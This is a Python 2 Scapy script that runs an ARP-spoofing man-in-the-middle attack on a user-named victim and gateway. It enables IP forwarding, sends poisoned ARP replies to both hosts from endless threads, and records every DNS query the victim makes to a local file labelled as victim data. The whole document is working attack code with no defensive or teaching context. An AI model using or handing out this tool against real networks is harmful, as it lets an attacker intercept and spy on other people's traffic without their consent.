#/bin/python

from scapy.all import *
import threading
import os
import sys

VIP = raw_input('Enter  IP address of the Victim : ')
GW = raw_input('Enter IP address of the gateway: ')
IFACE = raw_input('Enter the name of your interface: ')
print '\n**********Run As Root!************************'

print '\t\t\n -----------Poisoning Victim & Interface--------------  .. '
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
print 'Victim  Receving Packets'

def dnshandle(pkt):
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
			filename = "Middle_man_Victim_data.txt" #saving Data
			f = open(filename,"a")
                        a= 'Victim: ' + VIP + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
 			f.write(a+"\n")
			f.close()
			print a

def v_poison():
        v = ARP(pdst=VIP, psrc=GW)   #ARP Packet
        while True:
                try:
                       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                     # constructing and sending the ARP packets
                         sys.exit(1)
def gw_poison():
        gw = ARP(pdst=GW, psrc=VIP)
        while True:
                try:
                       send(gw,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:
                        sys.exit(1)
 
vthread = []
gwthread = []  
 
 
while True:     # Threads For Continiuos Request

        vpoison = threading.Thread(target=v_poison)
        vpoison.setDaemon(True)
        vthread.append(vpoison)
        vpoison.start()        
       
        gwpoison = threading.Thread(target=gw_poison)
        gwpoison.setDaemon(True)
        gwthread.append(gwpoison)
        gwpoison.start()
 
       
        pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)



print 'Saved Data By File  Name Victim_Data.txt'
